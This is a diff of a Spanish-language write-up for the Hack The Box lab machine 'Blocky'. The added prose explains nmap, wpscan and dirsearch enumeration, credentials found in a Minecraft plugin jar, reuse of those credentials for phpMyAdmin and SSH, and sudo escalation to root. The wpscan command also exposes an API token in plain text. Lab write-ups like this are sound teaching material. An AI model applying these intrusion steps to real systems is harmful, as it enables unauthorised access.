@@ -54,7 +54,7 @@ Nmap done: 1 IP address (1 host up) scanned in 102.04 seconds
            Raw packets sent: 131142 (5.770MB) | Rcvd: 132 (7.804KB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -67,7 +67,7 @@ Nmap done: 1 IP address (1 host up) scanned in 102.04 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran servicios como FTP o SSH, una página Web del CMS **WordPress** y el servicio de **Minecraft**.
 
 ```bash
 ❯ nmap -sCV -p21,22,80,25565 10.10.10.37 -A -oN targeted -oX targetedXML
@@ -105,7 +105,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
@@ -114,30 +114,28 @@ Nmap done: 1 IP address (1 host up) scanned in 17.44 seconds
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/4482_vmware_fY63UhxwZ1.png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos en nuestro archivo `/etc/hosts` la siguiente entrada.
 
 ```bash
 ❯ cat /etc/hosts | grep 10.10.10.37
 10.10.10.37 blocky.htb
 ```
 
-
-
 ## Web Enumeration
 
-
+Al acceder a [http://blocky.htb](http://blocky.htb) verificamos que se trata de una página web de **WordPress** en la cual tiene un blog sobre un servidor de **Minecraft**.
 
 <figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### WordPress Enumeration (WPScan)
 
+Debido a que se trata del CMS de **WordPress**, utilizaremos la herramienta de `wpscan` para realizar una enumeración en busca de vulnerabilidades del CMS.
 
+En el resultado obtenido, verificamos que existen diversas vulnerabilidades y logramos enumerar usuarios del WP.
 
 ```bash
 ❯ wpscan --no-banner --url http://blocky.htb/ --enumerate vt,vp,u --random-user-agent --api-token "3RgqcAfTskXCuHlHqGwlfskcGZIs0srAYo4RsDys0gg"
@@ -267,15 +265,9 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:21dir
 ```
 
-
-
-## Initial Access
-
-
-
 ### Information Leakage
 
-
+Realizaremos una enumeración de directorios y archivos de la página web a través de la herramienta de `dirsearch`. En el resultado obtenido, verificamos que existen diferentes directorios y páginas PHP.
 
 ```bash
 ❯ dirsearch -u 'http://blocky.htb' -i 200 -t 50 2>/dev/null
@@ -311,35 +303,39 @@ Task Completed
 
 ```
 
-
-
-
-
-
+Revisando de acceder a [http://blocky.htb/plugins/](http://blocky.htb/plugins/), verificamos que nos proporcionan de dos archivos `.jar` de plugins de **Minecraft**.
 
 <figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+## Initial Access
 
 ### Analyzing a jar file (JADX-GUI)
 
+Analizaremos los archivos `.jar` encontrados en busca de información en el código fuente, para ello utilizaremos la herramienta de `JADX-GUI`.
+
+Al revisar el archivo `BlockyCore.jar` visualizamos unas credenciales en el código fuente, al parecer se tratan de las credenciales de acceso al SQL.
+
 <figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
 
 ### Accessing PhpMyAdmin with recently found password
 
+En la enumeración de los directorios con`dirsearch`, nos encontramos que `phpmyadmin` se encontraba expuesto.
+
+Por lo tanto, probaremos de acceder a [http://blocky.htb/phpmyadmin](http://blocky.htb/phpmyadmin) con las credenciales encontradas.&#x20;
+
 <figure><img src="../../.gitbook/assets/imagen (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+Al ingresar al `phpMyAdmin` verificamos que existe en la base de datos `wordpress` una tabla llamada `wp_users`.
 
+En los datos que dispone dicha tabla, nos encontramos al usuario`notch` con credenciales en formato hash.
+
+Probamos de intentar crackear ese hash, pero tardaba mucho en intentar crackear el hash y no logramos obtener ningún resultado.
 
 <figure><img src="../../.gitbook/assets/imagen (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
 ### Trying access on SSH with recently found password
+
+Probamos de acceder al equipo mediante ssh con el usuario `root` y no nos funcionó el acceso, mientras que con el usuario `notch` pudimos acceder sin problemas. Logramos visualizar la flag de **user.txt**.
 
 ```bash
 ❯ ssh root@blocky.htb
@@ -369,13 +365,15 @@ notch@Blocky:~$ cat user.txt
 d2509c6d347*********************
 ```
 
-
-
 ## Privilege Escalation
 
 ### Abusing sudoers privilege
 
+Al revisar los grupos en los que se encuentra el usuario `notch`, verificamos que forma parte del grupo `sudo`. Tratamos de acceder como usuario `sudo` y logramos obtener acceso como usuario `root` y visualizar la flag de **root.txt**.
 
+{% hint style="info" %}
+El grupo sudo en Linux permite a los usuarios ejecutar comandos como superusuario (root) usando sudo. Los usuarios dentro de este grupo pueden obtener privilegios elevados temporalmente sin necesidad de cambiar a root.
+{% endhint %}
 
 ```bash
 notch@Blocky:~$ id
@@ -384,5 +382,5 @@ notch@Blocky:~$ sudo su
 [sudo] password for notch: 
 root@Blocky:/home/notch# cd /root
 root@Blocky:~# cat root.txt 
-828a540647b901b3436eb56a7b5e0f86
+828a54064***********************
 ```
